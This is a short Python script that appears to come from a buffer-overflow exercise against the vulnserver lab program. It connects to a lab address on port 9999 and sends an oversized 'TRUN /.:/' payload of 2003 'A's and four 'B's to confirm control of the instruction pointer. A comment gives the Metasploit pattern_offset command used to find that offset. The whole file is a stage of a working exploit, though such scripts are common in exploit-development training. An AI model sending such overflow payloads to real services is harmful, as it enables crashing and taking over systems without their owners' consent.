#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.187.128',9999))                          
        s.send(("TRUN /.:/" + shellcode))
        s.close()
	
except: 
        print ("Error while Connecting")
        sys.exit()


# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
